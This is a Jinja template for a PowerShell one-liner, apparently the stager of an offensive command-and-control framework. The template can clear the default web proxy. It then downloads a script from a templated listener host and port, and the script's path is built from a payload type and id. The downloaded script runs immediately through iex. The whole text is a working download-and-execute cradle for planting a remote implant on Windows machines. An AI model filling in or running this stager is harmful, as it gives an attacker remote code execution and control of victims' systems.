
{% if proxy == False %}
[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($null);{% endif %} iex((New-Object System.Net.WebClient).DownloadString("http://{{ lhost }}:{{ lport }}/p/win/{{ type }}/{{ id }}/start"))
